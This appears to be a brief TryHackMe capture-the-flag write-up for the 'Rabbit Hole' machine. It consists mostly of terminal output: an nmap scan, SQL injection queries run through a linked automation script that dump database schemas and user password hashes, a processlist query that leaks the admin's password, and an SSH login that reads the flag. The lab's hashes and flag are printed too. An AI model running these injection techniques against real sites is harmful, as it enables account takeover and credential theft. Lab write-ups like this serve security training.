---
title: Rabit Hole
date: '2024-12-30'
category: tryhackme
tags: tryhackme, ctf
description: Detailed technical walkthrough and security analysis for the Rabit Hole
  machine on TryHackMe.
slug: rabit-hole
---





> Using nmap againes to rabit.thm find,

```
❯ nmap rabit.thm
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-09 06:16 EDT
Stats: 0:05:07 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 94.00% done; ETC: 06:22 (0:00:20 remaining)
Nmap scan report for rabit.thm (10.201.85.14)
Host is up (0.79s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE    SERVICE
7/tcp    filtered echo
22/tcp   open     ssh
80/tcp   open     http
1102/tcp filtered adobeserver-1


```

> So using http find login forum and use some Scripts

> [[https://github.com/mhsn1/RabbitHole-THM-Writeup.git]]

```
❯ ./sqli_automate2.py 'http://rabit.thm/' 'SELECT group_concat(schema_name) FROM information_schema.schemata'

information_schema,web

```

```
❯ python3 sqli_automate2.py 'http://rabit.thm/' 'SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema="web"'
users,logins

```

```
❯ python3 sqli_automate2.py 'http://rabit.thm/' 'SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema="web" AND table_name="users"'
id,username,password,group

```

```
❯ python3 sqli_automate2.py 'http://rabit.thm/' 'SELECT group_concat(id,":",username,":",password,":",`group` SEPARATOR "\n") FROM web.users WHERE id<4'
1:admin:0e3ab8e45ac1163c2343990e427c66ff:admin
2:foo:a51e47f646375ab6bf5dd2c42d3e6181:guest
3:bar:de97e75e5b4604526a2afaed5f5439d7:guest

```

```
❯ python3 processlist_extractor.py 'http://rabit.thm/' 'SELECT INFO_BINARY FROM information_schema.PROCESSLIST WHERE INFO_BINARY NOT LIKE "%INFO_BINARY%" LIMIT 1'

SELECT * from users where (username= 'admin' and password=md5('fEeFBqOXBOLmjpTt0B3LNpuwlr7mJxI9dR8kgTpbOQcLlvgmoCt35qogicf8ao0Q') ) UNION ALL SELECT null,null,null,SLEEP(5) LIMIT 2


```

```
ssh admin@rabit.thm

Password - fEeFBqOXBOLmjpTt0B3LNpuwlr7---------------------------
```

```
❯ ssh admin@rabit.thm
The authenticity of host 'rabit.thm (10.201.85.14)' can't be established.
ED25519 key fingerprint is SHA256:Isaoxan2d+XFoXmwu4RWDMAjr+A4MZGLPoacIxv/gSc.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'rabit.thm' (ED25519) to the list of known hosts.
admin@rabit.thm's password: 
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

admin@ubuntu-jammy:~$ ls
flag.txt
admin@ubuntu-jammy:~$ cat flag.txt
THM{this_is_the_way_step_inside_jNu8uJ9tvKfH1n48}
admin@ubuntu-jammy:~$ 



```